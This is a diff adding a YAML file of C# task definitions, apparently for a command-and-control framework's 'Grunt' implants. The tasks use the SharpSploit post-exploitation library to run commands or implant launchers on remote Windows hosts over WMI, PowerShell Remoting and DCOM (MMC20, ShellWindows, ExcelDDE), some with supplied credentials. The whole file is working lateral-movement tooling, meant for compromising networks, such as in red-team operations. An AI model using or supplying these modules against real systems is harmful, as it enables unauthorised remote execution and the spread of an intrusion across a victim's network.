@@ -1,0 +1,760 @@
+- Name: WMIGrunt
+  Aliases: []
+  Description: Execute a Grunt Launcher on a remote system using Win32_Process Create, optionally with alternate credentials.
+  Author: 
+      Name: Ryan Cobb
+      Handle: cobbr_io
+      Link: https://twitter.com/cobbr_io
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+    using System.Collections.Generic;
+
+    using SharpSploit.Generic;
+    using SharpSploit.LateralMovement;
+
+    public static class Task
+    {
+        public static string Execute(string ComputerName, string Command, string Username = "", string Password = "")
+        {
+            try
+            {
+                WMI.WmiExecuteResult result = WMI.WMIExecute(ComputerName, Command, Username, Password);
+                if (result != null)
+                {
+                    return new SharpSploitResultList<WMI.WmiExecuteResult> { WMI.WMIExecute(ComputerName, Command, Username, Password) }.ToString();
+                }
+                else
+                {
+                    return "WMI Execution Failed";
+                }
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ComputerName
+    Value: localhost
+    DefaultValue: ''
+    Description: ComputerName to launch the Grunt on.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Launcher
+    Value: PowerShell
+    DefaultValue: ''
+    Description: Grunt Launcher to execute on the remote system.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Username
+    Value: ''
+    DefaultValue: ''
+    Description: 'Username to authenticate as. Format: DOMAIN\Username (optional)'
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Password
+    Value: ''
+    DefaultValue: ''
+    Description: Password to authenticate the user. (optional)
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions: &o0
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: WMICommand
+  Aliases: []
+  Description: Execute a process on a remote system using Win32_Process Create, optionally with alternate credentials.
+  Author: 
+      Name: Ryan Cobb
+      Handle: cobbr_io
+      Link: https://twitter.com/cobbr_io
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+    using System.Collections.Generic;
+
+    using SharpSploit.Generic;
+    using SharpSploit.LateralMovement;
+
+    public static class Task
+    {
+        public static string Execute(string ComputerName, string Command, string Username = "", string Password = "")
+        {
+            try
+            {
+                WMI.WmiExecuteResult result = WMI.WMIExecute(ComputerName, Command, Username, Password);
+                if (result != null)
+                {
+                    return new SharpSploitResultList<WMI.WmiExecuteResult> { WMI.WMIExecute(ComputerName, Command, Username, Password) }.ToString();
+                }
+                else
+                {
+                    return "WMI Execution Failed";
+                }
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ComputerName
+    Value: localhost
+    DefaultValue: ''
+    Description: ComputerName to create the process on.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: Command line to execute on the remote system.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Username
+    Value: ''
+    DefaultValue: ''
+    Description: 'Username to authenticate as. Format: DOMAIN\Username (optional)'
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Password
+    Value: ''
+    DefaultValue: ''
+    Description: Password to authenticate the user. (optional)
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions: *o0
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: PowerShellRemotingGrunt
+  Aliases: []
+  Description: Execute a Grunt Launcher on a remote system using PowerShell Remoting, optionally with alternate credentials.
+  Author: 
+      Name: Daniel Duggan
+      Handle: _RastaMouse
+      Link: https://twitter.com/_RastaMouse
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+
+    using SharpSploit.LateralMovement;
+
+    public static class Task
+    {
+        public static string Execute(string ComputerName, string Command, string Domain = "", string Username = "", string Password = "")
+        {
+            try
+            {
+                return PowerShellRemoting.InvokeCommand(ComputerName, Command, Domain, Username, Password);
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ComputerName
+    Value: ''
+    DefaultValue: ''
+    Description: ComputerName to launch the Grunt on.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Launcher
+    Value: PowerShell
+    DefaultValue: ''
+    Description: Grunt Launcher to execute on the remote system.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Domain
+    Value: ''
+    DefaultValue: ''
+    Description: The domain to execute as.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Username
+    Value: ''
+    DefaultValue: ''
+    Description: The username to execute as.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Password
+    Value: ''
+    DefaultValue: ''
+    Description: The password to execute as.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions: *o0
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: PowerShellRemotingCommand
+  Aliases: []
+  Description: Execute a PowerShell command on a remote system using PowerShell Remoting, optionally with alternate credentials.
+  Author: 
+      Name: Daniel Duggan
+      Handle: _RastaMouse
+      Link: https://twitter.com/_RastaMouse
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+
+    using SharpSploit.LateralMovement;
+
+    public static class Task
+    {
+        public static string Execute(string ComputerName, string Command, string Domain = "", string Username = "", string Password = "")
+        {
+            try
+            {
+                return PowerShellRemoting.InvokeCommand(ComputerName, Command, Domain, Username, Password);
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ComputerName
+    Value: ''
+    DefaultValue: ''
+    Description: ComputerName of the remote system.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: PowerShell command to execute on the remote system.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Domain
+    Value: ''
+    DefaultValue: ''
+    Description: The domain to execute as.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Username
+    Value: ''
+    DefaultValue: ''
+    Description: The username to execute as.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Password
+    Value: ''
+    DefaultValue: ''
+    Description: The password to execute as.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions: *o0
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: DCOMGrunt
+  Aliases: []
+  Description: Execute a Grunt Launcher on a remote system using various DCOM methods.
+  Author: 
+      Name: Ryan Cobb
+      Handle: cobbr_io
+      Link: https://twitter.com/cobbr_io
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+
+    using SharpSploit.LateralMovement;
+
+    public static class Task
+    {
+        public static string Execute(string ComputerName, string Command, string Parameters = "", string Directory = "C:\\WINDOWS\\System32\\", string Method = "MMC20.Application")
+        {
+            try
+            {
+                DCOM.DCOMMethod theMethod = DCOM.DCOMMethod.MMC20_Application;
+                if (Method.ToLower() == "shellwindows") { theMethod = DCOM.DCOMMethod.ShellWindows; }
+                else if (Method.ToLower() == "shellbrowserwindow") { theMethod = DCOM.DCOMMethod.ShellBrowserWindow; }
+                else if (Method.ToLower() == "exceldde") { theMethod = DCOM.DCOMMethod.ExcelDDE; }
+                else if (Method.ToLower() != "mmc20_application" && Method.ToLower() != "mmc20.application") { return "DCOM Execution failed. Invalid DCOMMethod specified."; }
+
+                if (DCOM.DCOMExecute(ComputerName, Command, Parameters, Directory, theMethod))
+                {
+                    return "DCOM execution successful. Executed: \"" + Directory + Command + " " + Parameters + "\" on: " + ComputerName;
+                }
+                else
+                {
+                    return "DCOM execution failed.";
+                }
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ComputerName
+    Value: localhost
+    DefaultValue: ''
+    Description: ComputerName to execute the process on.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Launcher
+    Value: PowerShell
+    DefaultValue: ''
+    Description: Grunt Launcher to execute on the remote system.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Method
+    Value: MMC20.Application
+    DefaultValue: MMC20.Application
+    Description: DCOM method to use for execution.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions: *o0
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: DCOMCommand
+  Aliases: []
+  Description: Execute a process on a remote system using various DCOM methods.
+  Author: 
+      Name: Ryan Cobb
+      Handle: cobbr_io
+      Link: https://twitter.com/cobbr_io
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+
+    using SharpSploit.LateralMovement;
+
+    public static class Task
+    {
+        public static string Execute(string ComputerName, string Command, string Parameters = "", string Directory = "C:\\WINDOWS\\System32\\", string Method = "MMC20.Application")
+        {
+            try
+            {
+                DCOM.DCOMMethod theMethod = DCOM.DCOMMethod.MMC20_Application;
+                if (Method.ToLower() == "shellwindows") { theMethod = DCOM.DCOMMethod.ShellWindows; }
+                else if (Method.ToLower() == "shellbrowserwindow") { theMethod = DCOM.DCOMMethod.ShellBrowserWindow; }
+                else if (Method.ToLower() == "exceldde") { theMethod = DCOM.DCOMMethod.ExcelDDE; }
+                else if (Method.ToLower() != "mmc20_application" && Method.ToLower() != "mmc20.application") { return "DCOM Execution failed. Invalid DCOMMethod specified."; }
+
+                if (DCOM.DCOMExecute(ComputerName, Command, Parameters, Directory, theMethod))
+                {
+                    return "DCOM execution successful. Executed: \"" + Directory + Command + " " + Parameters + "\" on: " + ComputerName;
+                }
+                else
+                {
+                    return "DCOM execution failed.";
+                }
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ComputerName
+    Value: localhost
+    DefaultValue: ''
+    Description: ComputerName to execute the process on.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: Executable to execute on the remote system.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Parameters
+    Value: ''
+    DefaultValue: ''
+    Description: Command line parameters to pass to the Command.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Directory
+    Value: ''
+    DefaultValue: C:\Windows\System32\
+    Description: Directory on the remote system containing the Command executable.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Method
+    Value: MMC20.Application
+    DefaultValue: MMC20.Application
+    Description: DCOM method to use for execution.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit\SharpSploit\
+    Language: CSharp
+    CompatibleDotNetVersions: *o0
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net35\System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40\System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40\System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40\System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40\System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net35\System.Management.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35\System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35\System.IdentityModel.dll
+      DotNetVersion: Net35
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
